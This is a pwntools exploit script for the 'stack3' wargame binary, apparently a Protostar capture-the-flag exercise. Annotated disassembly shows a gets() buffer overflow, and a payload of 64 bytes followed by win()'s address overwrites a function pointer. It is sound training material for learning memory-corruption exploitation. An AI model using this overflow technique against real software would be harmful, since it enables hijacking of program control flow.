#   0x0804843e <+6>:	sub    esp,0x60                     # Buffer size is 0x60
#   0x08048441 <+9>:	mov    DWORD PTR [esp+0x5c],0x0     # int the function pointer
#   0x08048449 <+17>:	lea    eax,[esp+0x1c]
#   0x0804844d <+21>:	mov    DWORD PTR [esp],eax
#   0x08048450 <+24>:	call   0x8048330 <gets@plt>         # vuln
#   0x08048455 <+29>:	cmp    DWORD PTR [esp+0x5c],0x0
#   0x0804845a <+34>:	je     0x8048477 <main+63>
#   0x0804845c <+36>:	mov    eax,0x8048560
#   0x08048461 <+41>:	mov    edx,DWORD PTR [esp+0x5c]     # Fp in edx
#   0x08048465 <+45>:	mov    DWORD PTR [esp+0x4],edx      # Copy of the function's ptr into the local variable esp+0x4
#   0x08048469 <+49>:	mov    DWORD PTR [esp],eax
#   0x0804846c <+52>:	call   0x8048350 <printf@plt>
#   0x08048471 <+57>:	mov    eax,DWORD PTR [esp+0x5c]     # function pointer store into the local variable esp+0x5c
#   0x08048475 <+61>:	call   eax                          # eax will point to the win() function entrypoint
#   0x08048477 <+63>:	leave  
#   0x08048478 <+64>:	ret  
#
#gef➤  x/s 0x8048560
#0x8048560:	"calling function pointer, jumping to 0x%08x\n"
#
#File stack3/stack3.c:
#11:	int main(int, char **);
#6:	void win(void);
#
#gef➤  disassemble win
#Dump of assembler code for function win:
#   0x08048424 <+0>:	push   ebp                      # The goal is to overwrite the function's ptr to jmp to the win() function

from pwn import *

elf = ELF('./stack3')
p = elf.process()

buf = b'A' * 64
win = p32(elf.symbols['win'])
#win = p32(0x8048424)
payload = buf + win

log.info('Overwriting the function ptr by win() entrypoint')

p.sendline(payload)

result = p.recvuntil("changed")
print(result.decode())
